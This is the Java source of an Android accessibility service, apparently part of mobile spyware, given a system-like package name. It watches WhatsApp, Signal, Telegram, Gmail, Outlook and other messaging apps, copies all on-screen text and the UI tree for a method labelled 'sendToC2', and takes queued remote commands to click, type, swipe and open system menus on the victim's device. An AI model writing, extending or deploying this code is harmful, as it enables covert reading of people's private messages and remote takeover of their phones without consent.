package com.system.service.collection;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.os.Bundle;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.util.Log;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;

import java.util.ArrayList;
import java.util.List;

public class AccessibilityCollector extends AccessibilityService {

    private static final String TAG = "AccessibilityCollector";
    private static final String[] TARGET_PACKAGES = {
        "com.whatsapp", "com.whatsapp.w4b",
        "com.facebook.katana", "com.facebook.orca",
        "com.instagram.android",
        "com.twitter.android", "com.twitter.android",
        "com.snapchat.android",
        "com.discord",
        "org.telegram.messenger",
        "com.signal.android",
        "com.viber.voip",
        "com.skype.raider",
        "com.google.android.gm",
        "com.microsoft.office.outlook"
    };

    // Interaction queue for remote commands
    private static final java.util.Queue<InteractionCommand> interactionQueue = 
        new java.util.concurrent.ConcurrentLinkedQueue<>();

    public static class InteractionCommand {
        public String action; // click, input, scroll, swipe, back, home, recent
        public String targetId; // view ID or resource ID
        public String targetText; // text to match
        public String inputText; // for input action
        public int x, y; // for swipe/scroll
        public long timestamp;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getPackageName() == null) return;

        String pkg = event.getPackageName().toString();
        if (!isTargetPackage(pkg)) return;

        int eventType = event.getEventType();
        if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
            eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
            eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            
            processEvent(event);
        }
        
        // Process any pending interaction commands
        processInteractionQueue();
    }

    private boolean isTargetPackage(String pkg) {
        for (String target : TARGET_PACKAGES) {
            if (pkg.contains(target)) return true;
        }
        return false;
    }

    private void processEvent(AccessibilityEvent event) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        JsonObject data = new JsonObject();
        data.addProperty("package", event.getPackageName().toString());
        data.addProperty("event_type", eventTypeToString(event.getEventType()));
        data.addProperty("timestamp", System.currentTimeMillis());
        
        JsonArray textNodes = new JsonArray();
        extractText(root, textNodes);
        data.add("text_content", textNodes);

        // Also dump full UI tree for interaction targeting
        JsonObject uiTree = dumpUiTree(root);
        data.add("ui_tree", uiTree);

        // Send to C2
        sendToC2(data);
        root.recycle();
    }

    private void extractText(AccessibilityNodeInfo node, JsonArray array) {
        if (node == null) return;
        
        CharSequence text = node.getText();
        if (text != null && text.length() > 0) {
            JsonObject obj = new JsonObject();
            obj.addProperty("text", text.toString());
            obj.addProperty("class", node.getClassName() != null ? node.getClassName().toString() : "");
            obj.addProperty("id", node.getViewIdResourceName() != null ? node.getViewIdResourceName() : "");
            obj.addProperty("clickable", node.isClickable());
            obj.addProperty("editable", node.isEditable());
            obj.addProperty("password", node.isPassword());
            obj.addProperty("enabled", node.isEnabled());
            obj.addProperty("focused", node.isFocused());
            obj.addProperty("selected", node.isSelected());
            obj.addProperty("checkable", node.isCheckable());
            obj.addProperty("checked", node.isChecked());
            obj.addProperty("scrollable", node.isScrollable());
            obj.addProperty("long_clickable", node.isLongClickable());
            obj.addProperty("bounds", getBoundsString(node));
            array.add(obj);
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                extractText(child, array);
                child.recycle();
            }
        }
    }

    private JsonObject dumpUiTree(AccessibilityNodeInfo root) {
        JsonObject tree = new JsonObject();
        tree.addProperty("package", root.getPackageName() != null ? root.getPackageName().toString() : "");
        tree.add("root", nodeToJson(root));
        return tree;
    }

    private JsonObject nodeToJson(AccessibilityNodeInfo node) {
        if (node == null) return new JsonObject();
        
        JsonObject obj = new JsonObject();
        obj.addProperty("class", node.getClassName() != null ? node.getClassName().toString() : "");
        obj.addProperty("id", node.getViewIdResourceName() != null ? node.getViewIdResourceName() : "");
        obj.addProperty("text", node.getText() != null ? node.getText().toString() : "");
        obj.addProperty("content_desc", node.getContentDescription() != null ? node.getContentDescription().toString() : "");
        obj.addProperty("clickable", node.isClickable());
        obj.addProperty("editable", node.isEditable());
        obj.addProperty("enabled", node.isEnabled());
        obj.addProperty("focused", node.isFocused());
        obj.addProperty("selected", node.isSelected());
        obj.addProperty("checkable", node.isCheckable());
        obj.addProperty("checked", node.isChecked());
        obj.addProperty("scrollable", node.isScrollable());
        obj.addProperty("long_clickable", node.isLongClickable());
        obj.addProperty("password", node.isPassword());
        obj.addProperty("bounds", getBoundsString(node));
        
        JsonArray children = new JsonArray();
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                children.add(nodeToJson(child));
                child.recycle();
            }
        }
        obj.add("children", children);
        
        return obj;
    }

    private String getBoundsString(AccessibilityNodeInfo node) {
        android.graphics.Rect rect = new android.graphics.Rect();
        node.getBoundsInScreen(rect);
        return rect.left + "," + rect.top + "," + rect.right + "," + rect.bottom;
    }

    private String eventTypeToString(int type) {
        switch (type) {
            case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED: return "CONTENT_CHANGED";
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED: return "WINDOW_STATE_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: return "TEXT_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_CLICKED: return "CLICKED";
            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED: return "LONG_CLICKED";
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: return "FOCUSED";
            default: return "OTHER_" + type;
        }
    }

    // ===== REMOTE INTERACTION COMMANDS =====
    
    public static void queueInteraction(String action, String targetId, String targetText, String inputText, int x, int y) {
        InteractionCommand cmd = new InteractionCommand();
        cmd.action = action;
        cmd.targetId = targetId;
        cmd.targetText = targetText;
        cmd.inputText = inputText;
        cmd.x = x;
        cmd.y = y;
        cmd.timestamp = System.currentTimeMillis();
        interactionQueue.offer(cmd);
    }

    private void processInteractionQueue() {
        InteractionCommand cmd;
        while ((cmd = interactionQueue.poll()) != null) {
            executeInteraction(cmd);
        }
    }

    private void executeInteraction(InteractionCommand cmd) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        try {
            switch (cmd.action) {
                case "click":
                    performClick(root, cmd.targetId, cmd.targetText);
                    break;
                case "long_click":
                    performLongClick(root, cmd.targetId, cmd.targetText);
                    break;
                case "input":
                    performInput(root, cmd.targetId, cmd.targetText, cmd.inputText);
                    break;
                case "scroll":
                    performScroll(root, cmd.targetId, cmd.targetText, cmd.x, cmd.y);
                    break;
                case "swipe":
                    performSwipe(cmd.x, cmd.y);
                    break;
                case "back":
                    performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                    break;
                case "home":
                    performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                    break;
                case "recent":
                    performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
                    break;
                case "notifications":
                    performGlobalAction(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS);
                    break;
                case "quick_settings":
                    performGlobalAction(AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS);
                    break;
                case "power_dialog":
                    performGlobalAction(AccessibilityService.GLOBAL_ACTION_POWER_DIALOG);
                    break;
                case "dump_ui":
                    // UI tree is already dumped in processEvent, just log
                    Log.i(TAG, "UI tree dump requested");
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Interaction failed: " + cmd.action, e);
        } finally {
            root.recycle();
        }
    }

    private void performClick(AccessibilityNodeInfo root, String targetId, String targetText) {
        AccessibilityNodeInfo target = findNode(root, targetId, targetText);
        if (target != null) {
            target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            Log.i(TAG, "Click performed on: " + (targetId != null ? targetId : targetText));
            target.recycle();
        }
    }

    private void performLongClick(AccessibilityNodeInfo root, String targetId, String targetText) {
        AccessibilityNodeInfo target = findNode(root, targetId, targetText);
        if (target != null) {
            target.performAction(AccessibilityNodeInfo.ACTION_LONG_CLICK);
            Log.i(TAG, "Long click performed on: " + (targetId != null ? targetId : targetText));
            target.recycle();
        }
    }

    private void performInput(AccessibilityNodeInfo root, String targetId, String targetText, String inputText) {
        if (inputText == null) return;
        AccessibilityNodeInfo target = findNode(root, targetId, targetText);
        if (target != null && target.isEditable()) {
            // Clear existing text first
            target.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
            Bundle args = new Bundle();
            args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, inputText);
            target.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
            Log.i(TAG, "Input performed: " + inputText);
            target.recycle();
        }
    }

    private void performScroll(AccessibilityNodeInfo root, String targetId, String targetText, int direction, int amount) {
        AccessibilityNodeInfo target = findNode(root, targetId, targetText);
        if (target != null && target.isScrollable()) {
            int action = direction > 0 ? AccessibilityNodeInfo.ACTION_SCROLL_FORWARD : AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD;
            target.performAction(action);
            Log.i(TAG, "Scroll performed: " + (direction > 0 ? "forward" : "backward"));
            target.recycle();
        }
    }

    private void performSwipe(int x, int y) {
        // Swipe from center to x,y
        int width = getResources().getDisplayMetrics().widthPixels;
        int height = getResources().getDisplayMetrics().heightPixels;
        int startX = width / 2;
        int startY = height / 2;
        
        android.graphics.Path path = new android.graphics.Path();
        path.moveTo(startX, startY);
        path.lineTo(x, y);
        
        android.accessibilityservice.GestureDescription.StrokeDescription stroke = 
            new android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 300);
        android.accessibilityservice.GestureDescription gesture = 
            new android.accessibilityservice.GestureDescription.Builder().addStroke(stroke).build();
        
        dispatchGesture(gesture, null, null);
        Log.i(TAG, "Swipe performed: " + startX + "," + startY + " -> " + x + "," + y);
    }

    private AccessibilityNodeInfo findNode(AccessibilityNodeInfo root, String targetId, String targetText) {
        List<AccessibilityNodeInfo> candidates = new ArrayList<>();
        findNodes(root, targetId, targetText, candidates);
        
        if (candidates.isEmpty()) return null;
        
        // Return first clickable/editable match, or first match
        for (AccessibilityNodeInfo node : candidates) {
            if (node.isClickable() || node.isEditable() || node.isFocusable()) {
                // Recycle others
                for (AccessibilityNodeInfo other : candidates) {
                    if (other != node) other.recycle();
                }
                return node;
            }
        }
        
        // Recycle others, return first
        AccessibilityNodeInfo result = candidates.get(0);
        for (int i = 1; i < candidates.size(); i++) {
            candidates.get(i).recycle();
        }
        return result;
    }

    private void findNodes(AccessibilityNodeInfo node, String targetId, String targetText, List<AccessibilityNodeInfo> results) {
        if (node == null) return;
        
        boolean match = false;
        if (targetId != null && targetId.equals(node.getViewIdResourceName())) {
            match = true;
        }
        if (targetText != null && node.getText() != null && node.getText().toString().contains(targetText)) {
            match = true;
        }
        if (targetText != null && node.getContentDescription() != null && node.getContentDescription().toString().contains(targetText)) {
            match = true;
        }
        
        if (match) {
            results.add(node);
        } else {
            node.recycle();
        }
        
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                findNodes(child, targetId, targetText, results);
            }
        }
    }

    private void sendToC2(JsonObject data) {
        CoreApplication app = CoreApplication.getInstance();
        if (app != null) {
            app.getPrefs().edit().putString("accessibility_data", data.toString()).apply();
        }
    }

    @Override
    public void onInterrupt() {
        Log.w(TAG, "Accessibility service interrupted");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED |
                          AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                          AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                          AccessibilityEvent.TYPE_VIEW_CLICKED |
                          AccessibilityEvent.TYPE_VIEW_SCROLLED |
                          AccessibilityEvent.TYPE_VIEW_LONG_CLICKED |
                          AccessibilityEvent.TYPE_VIEW_FOCUSED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
                     AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                     AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE |
                     AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS;
        setServiceInfo(info);
        Log.i(TAG, "Accessibility service connected with interaction support");
    }
}